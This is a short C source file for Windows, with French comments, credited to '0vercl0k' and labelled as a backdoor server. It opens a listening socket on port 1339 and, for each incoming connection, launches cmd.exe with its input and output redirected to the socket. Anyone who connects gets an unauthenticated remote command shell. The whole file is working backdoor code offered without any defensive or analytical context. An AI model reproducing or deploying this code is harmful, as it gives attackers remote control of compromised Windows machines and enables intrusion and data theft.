//Plus d'infos sur CreateProcess() : http://support.microsoft.com/kb/190351/fr

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h> //memset()

#define PORT 1339
#define HEAD "Backdoor Serveur par 0vercl0k.\n\n"
#define USAGE "usage : ./%s <port>\n\n"

void QuitteSocket(SOCKET* s1, SOCKET* s2);
void LanceSocketServeur();

int main(int argc , char *argv[])
{
    printf(HEAD);
    LanceSocketServeur();
	return 0;
}

void QuitteSocket(SOCKET* s1, SOCKET* s2)
{
    closesocket(*s1);
    closesocket(*s2);
    WSACleanup();
    exit(0);
}

void LanceSocketServeur()
{
    STARTUPINFO si; //Structure specifiant des attributs du prog ( genre nom de la fenetre..)
    PROCESS_INFORMATION pi; //structure qui sera rempli avec les données du nouveau processus
    WSADATA WSAData;
    int testStart = WSAStartup(MAKEWORD(2,0),&WSAData);
    SOCKET socketServeur =  WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0) , socketAccept = 0;

    memset(&si,0,sizeof(si));
    memset(&pi,0,sizeof(pi));

    if(socketServeur != INVALID_SOCKET && !testStart)
    {
        SOCKADDR_IN notreSocket = {0};
        notreSocket.sin_addr.s_addr = INADDR_ANY;
        notreSocket.sin_family = AF_INET;
        notreSocket.sin_port = htons(PORT);

        const char infosEnvoi[] = "Bienvenu dans le serveur d'0vercl0k\r\n\r\ncmd> ";

        char bufferRecu[30] = {0} , *reponseCommande = {0};
        int tailleStruct = sizeof(notreSocket);

        printf("[~]Lancement de l'ecoute sur le port : %d\n",PORT);

        if(( bind(socketServeur , (SOCKADDR *) &notreSocket , tailleStruct)) != SOCKET_ERROR)
        {
            printf("\n->Bind de la socket effectue.");
            if((listen(socketServeur,0)) != SOCKET_ERROR)
            {
                printf("\n->Listen de la socket effectue.\n\n[~]En attente d'une connexion..\n");

                while(1337)
                {
                    if((socketAccept = accept(socketServeur, (SOCKADDR *) &notreSocket , &tailleStruct)) != INVALID_SOCKET)
                    {
                        printf("->Un hote vient de se connecter.\n");
                        si.cb = sizeof(si); //Donne sa propre taille à la structure :°
                        si.dwFlags = STARTF_USESTDHANDLES;
                        si.hStdInput = si.hStdOutput = si.hStdError = (void *)socketAccept; // Redirection des handles vers la sock
                        CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
                    }
                }
            }
        }
    }
    printf("[+]Fermeture de la socket.\n");
    QuitteSocket(&socketAccept,&socketServeur);
}
